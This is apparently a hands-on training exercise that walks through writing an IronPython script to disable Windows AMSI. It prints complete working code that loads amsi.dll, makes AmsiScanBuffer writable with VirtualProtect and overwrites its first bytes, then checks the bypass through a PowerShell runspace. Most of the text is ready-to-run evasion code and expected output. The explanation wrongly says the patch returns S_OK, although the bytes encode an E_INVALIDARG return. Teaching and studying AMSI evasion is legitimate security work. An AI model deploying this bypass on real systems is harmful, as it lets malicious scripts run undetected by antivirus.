# Exercise 6: AMSI Bypass with IronPython
This exercise aims to build a script using IronPython to bypass the Anti-Malware Scan Interface (AMSI). AMSI is an open interface available on Windows 10 for applications to request, at runtime, a synchronous scan of a memory buffer by an installed antivirus or security solution. The script patches a specific method of the AMSI's DLL loaded in memory, therefore allowing malicious code to execute without detection.

The script utilizes functionalities provided by the ctypes library in IronPython, which provides C-compatible data types and allows to call functions in DLLs/shared libraries.

1. First, let's test that AMSI is working on the machine. Type `amsicontext` into the existing terminal
2. You should see a malware blocked error that looks like this

```powershell
At line:1 char:1
+ amsicontext
+ ~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
```

3. Now let's write the bypass by first creating another Python file called powershell_amsi_bypass.py, similar to Exercise 5
4. Start by importing the required modules. `clr`` allows IronPython to interface with .NET and System provides access to core .NET functionalities. os is a Python library for interacting with the Operating System.

```python
import clr
import System
import os
```

5. Load the System.Management.Automation .NET library. System.Management.Automation provides access to the PowerShell runtime. Runspaces enable creating and managing PowerShell runspaces, which are containers that host PowerShell pipelines.

```python
clr.AddReference("System.Management.Automation")
from System.Management.Automation import Runspaces
```

6. Import additional required modules and functions. These imports include both Python and .NET classes and functions used throughout the script. Notable ones are ctypes (provides C-compatible data types in Python), IntPtr and UInt32 (.NET data types), and Marshal (.NET class for marshaling data between managed and unmanaged code).

```python
import clrtype
from ctypes import *
import ctypes
from System import Convert, Text, Environment, IntPtr, UInt32
from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import DllImportAttribute, PreserveSigAttribute, Marshal, HandleRef, CharSet
```

7. Define the bypass function. This function starts by loading amsi.dll into the application's memory space using LoadLibrary.

```python
def bypass():
    windll.LoadLibrary("amsi.dll")
```

8. Get the handle of amsi.dll. Here, the script retrieves a module handle for amsi.dll, which is necessary to later get the address of the function to patch.

```python
windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
windll.kernel32.GetModuleHandleW.restype = c_void_p
handle = windll.kernel32.GetModuleHandleW('amsi.dll')
```

9. Retrieve the address of the AmsiScanBuffer function within amsi.dll. GetProcAddress retrieves the address of the AmsiScanBuffer function in memory, which is the function we will patch to bypass AMSI.
```python
windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
windll.kernel32.GetProcAddress.restype = c_void_p
BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
```

10. Change the memory protection of the AmsiScanBuffer function to PAGE_EXECUTE_READWRITE (0x40). VirtualProtect changes the protection on a region of committed pages in the virtual address space of the calling process.

```python
BufferAddress = IntPtr(BufferAddress)
Size = System.UInt32(0x05)
ProtectFlag = System.UInt32(0x40)
OldProtectFlag = Marshal.AllocHGlobal(0)
virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
```

11. Write a patch to the start of the AmsiScanBuffer function. The script patches AmsiScanBuffer to always return S_OK, causing AMSI to believe the scanned content is safe.

```python
patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
Marshal.Copy(patch, 0, BufferAddress, 6)
```

12. Define the main function to run the bypass and execute a PowerShell script. After bypassing AMSI, the script opens a PowerShell runspace, executes the PowerShell command 'amsicontext', and prints the output.

```python
def main():
    bypass()
    runspace = Runspaces.RunspaceFactory.CreateRunspace()
    runspace.Open()
    scriptInvoker = RunspaceInvoke(runspace)
    pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(r"'amsicontext'")
    pipeline.Commands.Add("Out-String")
    output = pipeline.Invoke()
    for o in output:
        print(o)
    runspace.Close()
```

13. Run the main function if the script is being run as a standalone program. The if __name__ == '__main__': Python idiom is used to ensure the main function is only run when the script is executed directly (not imported as a module).

```python
if __name__ == '__main__':
    main()
```

14. The script should look like the code below.

```python
import clr
import System
import os

clr.AddReference("System.Management.Automation")
from System.Management.Automation import Runspaces
from ctypes import *
import ctypes
from System import Convert, Text, Environment, IntPtr, UInt32
from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import DllImportAttribute, PreserveSigAttribute, Marshal, HandleRef, CharSet

def bypass():
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def main():
    bypass()
    runspace = Runspaces.RunspaceFactory.CreateRunspace()
    runspace.Open()
    scriptInvoker = RunspaceInvoke(runspace)
    pipeline = runspace.CreatePipeline()
    pipeline.Commands.AddScript(r"'amsicontext'")
    pipeline.Commands.Add("Out-String")
    output = pipeline.Invoke()
    for o in output:
        print(o)
    runspace.Close()

if __name__ == '__main__':
    main()
```

15. Execute the IronPython code using the following command in the terminal

```
.\ipy.exe powershell_amsi_bypass.py
```

16. If successful, you should see the output below

```powershell
amsicontext
```
